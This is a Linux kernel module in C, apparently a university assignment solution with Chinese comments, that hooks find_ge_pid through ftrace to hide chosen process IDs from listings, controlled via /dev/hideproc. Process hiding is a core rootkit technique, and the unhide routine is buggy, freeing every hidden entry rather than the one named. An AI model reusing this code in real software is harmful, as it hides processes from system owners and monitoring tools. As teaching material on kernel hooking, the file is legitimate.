#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

struct ftrace_hook {
    const char *name;
    void *func, *orig;
    unsigned long address;
    struct ftrace_ops ops;
};

static int hook_resolve_addr(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *) hook->orig) = hook->address;
    return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip,
                                      unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{
    int err = hook_resolve_addr(hook);
    if (err)
        return err;

    hook->ops.func = hook_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                      FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}

//#if 0
void hook_remove(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk("unregister_ftrace_function() failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk("ftrace_set_filter_ip() failed: %d\n", err);
}
//#endif

typedef struct {
    pid_t id;
    struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

static bool is_hidden_proc(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) { ///AAA答案  
        if (proc->id == pid)
            return true;
    }
    return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    struct pid *pid = real_find_ge_pid(nr, ns);
    while (pid && is_hidden_proc(pid->numbers->nr))
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

static void init_hook(void)
{
    real_find_ge_pid = (find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
    hook.name = "find_ge_pid";
    hook.func = hook_find_ge_pid;
    hook.orig = &real_find_ge_pid;
    hook_install(&hook);
}

static int hide_process(pid_t pid)
{
    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;
    list_add_tail(&proc->list_node, &hidden_proc);//CCC答案
    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {//BBB答案
        list_del(&proc->list_node);//DDD答案
        kfree(proc);
    }
    return SUCCESS;
}


#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

//使用 strsep 搜尋字串" "位置
// https://xiwan.io/archive/string-split-strtok-strtok-r-strsep.html
static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    long pid;
    char *message;
    char *ch_index; 
    char add_message[] = "add", del_message[] = "del",space_message[]=" ";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;

    message = kmalloc(len + 1, GFP_KERNEL);//GFP_KERNEL說明請看 https://blog.xuite.net/kerkerker2013/wretch/113322033
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);//buffer取出資料，放到message，而buffer 來自輸入變數 const char *buffer
    if (!memcmp(message, add_message, sizeof(add_message) - 1)) {//比較字串是否為 "add"
        ch_index = strsep(&message, space_message);//跳過"add"
	while((ch_index = strsep(&message, space_message))){
		kstrtol(ch_index, 10, &pid);//kstrtol()為將字串轉成 long 整數，解析字串從第 ch_index 格 位置開始，其中10代表轉成10進位   https://www.kernel.org/doc/htmldocs/kernel-api/API-kstrtol.html
		hide_process(pid);//作業問的內容 將取到的數字 隱藏此PID數字					
	}

    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {//比較字串是否為 "del"
        ch_index = strsep(&message, space_message);//跳過"del"
	while((ch_index = strsep(&message, space_message))){
		kstrtol(ch_index, 10, &pid);//kstrtol()為將字串轉成 long 整數，解析字串從第 ch_index 格 位置開始
		unhide_process(pid);//作業問的內容 將取到的數字 回復顯示此PID數字
	}
		
    } else {
        kfree(message);
        return -EAGAIN;
    }
    *offset = len;
    kfree(message);
    return len;
}

static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

//可以用 cat sys/class  查詢 掛載前後 有無 hideproc 目錄
//用 cat  /dev 查詢 掛載前後 有無 hideproc 目錄
// #define MKDEV(ma,mi)  
// MKDEV ，用於將主設備號和次設備號合成一個設備號，
//主設備可以通過查閱內核源碼的Documentation/devices.txt文件，而次設備號通常是從編號0開始。
// http://doc.embedfire.com/linux/imx6/base/zh/latest/linux_driver/character_device.html#id5

dev_t dev; //改成全域變數，才能在 _hideproc_exit(void)時
            //獲取主 device numbers        
static int _hideproc_init(void)
{
    int err, dev_major;   
    printk(KERN_INFO "@ %s\n", __func__);
    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);//alloc_chrdev_region()申請一個 char device numbers(字元設備號碼)
    dev_major = MAJOR(dev);//獲取主 device numbers

    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);//class_create(owner, name)在 sys/class/ 目錄下 創建一個class,
															
    cdev_init(&cdev, &fops);//初始化cdev
    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);//cdev_add()向系統註冊設備
    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                  DEVICE_NAME);//創建一個設備(在/dev目錄下創建設備文件)，並註冊到sysfs
								//因為我們寫 DEVICE_NAME "hideproc"，所以會創建在 /dev/hideproc 目錄
    init_hook();

    return 0;
}

static void _hideproc_exit(void)
{
    printk(KERN_INFO "@ %s\n", __func__);
    /* FIXME: ensure the release of all allocated resources */
    hook_remove(&hook); //移除 ftrace hook 
    device_destroy(hideproc_class, MKDEV(MAJOR(dev), 1));//刪除使用device_create函數創建的設備        
    class_destroy(hideproc_class);
    cdev_del(&cdev);//註銷設備
    unregister_chrdev_region(dev, MINOR_VERSION);//釋放設備號 
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);
